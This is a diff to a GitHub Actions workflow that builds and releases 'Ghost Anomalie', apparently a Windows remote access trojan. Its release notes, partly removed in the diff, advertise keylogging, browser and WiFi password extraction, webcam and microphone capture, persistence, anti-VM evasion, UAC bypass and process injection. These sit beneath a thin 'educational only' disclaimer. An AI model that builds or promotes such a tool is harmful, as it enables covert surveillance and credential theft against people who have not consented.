@@ -36,7 +36,7 @@ jobs:
           pip install -r requirements.txt
           pip install pyinstaller pillow opencv-python pyaudio pywin32 psutil wmi cryptography
       
-      # ===== 4. Generate icon (NO EMOJIS) =====
+      # ===== 4. Generate icon =====
       - name: Generate icon
         run: |
           python -c "
@@ -67,7 +67,7 @@ jobs:
             exit 1
           }
       
-      # ===== 7. Create ZIP (SEULEMENT L'EXE) =====
+      # ===== 7. Create ZIP =====
       - name: Create ZIP package
         run: |
           mkdir release_package
@@ -84,9 +84,9 @@ jobs:
             dist\${{ env.APP_NAME }}.exe
             ${{ env.APP_NAME }}_${{ github.ref_name }}.zip
       
-      # ===== 9. Create Release =====
+      # ===== 9. Create Release (VERSION CORRIGÉE) =====
       - name: Create GitHub Release
-        uses: softprops/action-gh-release@v1
+        uses: softprops/action-gh-release@v2
         with:
           files: |
             dist\${{ env.APP_NAME }}.exe
@@ -94,6 +94,8 @@ jobs:
           draft: false
           prerelease: false
           generate_release_notes: false
+          tag_name: ${{ github.ref_name }}
+          name: Ghost Anomalie ${{ github.ref_name }}
           body: |
             # Ghost Anomalie ${{ github.ref_name }}
             
@@ -126,49 +128,6 @@ jobs:
             7. Control them from the interface!
             ```
             
-            ## Features
-            
-            ### Remote Control
-            - Real-time desktop streaming
-            - Mouse & keyboard control
-            - Application launcher (visible/hidden)
-            - Multiple monitor support
-            
-            ### Security Testing
-            - Keylogger (keyboard capture)
-            - Password extraction (WiFi, Chrome)
-            - Clipboard monitoring
-            - Screen recording
-            
-            ### File Management
-            - Full file browser
-            - Upload/Download files
-            - Search & filter
-            - Archive support
-            
-            ### Surveillance
-            - Webcam access (with consent)
-            - Microphone recording
-            - File monitoring
-            - Screen capture
-            
-            ### Stealth & Persistence
-            - Process hiding
-            - Multi-location installation
-            - Registry persistence
-            - Scheduled tasks
-            - Startup folder
-            - Anti-VM detection
-            - Anti-Debug protection
-            - Polymorphism (change file hash)
-            
-            ### Network Tools
-            - Network scanner
-            - Port scanner
-            - ARP scanner
-            - WiFi list & connect
-            - DNS flush
-            
             ## Commands (92+)
             
             | Category | Commands |
@@ -187,11 +146,7 @@ jobs:
             | **Stealth** | hide, persist, uac_bypass, polymorph, inject, selfdestruct |
             | **Fun** | popup, speak, website, beep, cd_eject, volume_set, volume_mute |
             
-            > Full command list available in the README
-            
             ## Legal & Security
-            
-            ### IMPORTANT NOTICE
             
             **This software is for EDUCATIONAL PURPOSES ONLY.**
             
@@ -199,26 +154,8 @@ jobs:
             
             1. Use only on systems you OWN or have EXPLICIT WRITTEN PERMISSION to test
             2. Use for CYBERSECURITY LEARNING and RESEARCH
-            3. Use in CTF COMPETITIONS and AUTHORIZED PENETRATION TESTS
-            4. NEVER use on devices without consent
-            5. NEVER use for illegal activities (data theft, espionage, fraud, etc.)
-            
-            ### Legal Consequences
-            
-            | Country | Law | Penalty |
-            |---------|-----|---------|
-            | USA | CFAA | Up to 20 years, $250,000 |
-            | UK | Computer Misuse Act | Up to 10 years |
-            | France | Loi Godfrain | Up to 5 years, EUR 300,000 |
-            | Gabon | Loi N001/2019 | Up to 10 years, 300,000,000 FCFA |
-            
-            ## Documentation
-            
-            - [README.md](https://github.com/${{ github.repository }}/blob/main/README.md) - Full documentation
-            
-            ## Bug Reports & Feedback
-            
-            - Open an issue: [GitHub Issues](https://github.com/${{ github.repository }}/issues)
+            3. NEVER use on devices without consent
+            4. NEVER use for illegal activities (data theft, espionage, fraud, etc.)
             
             ---
             
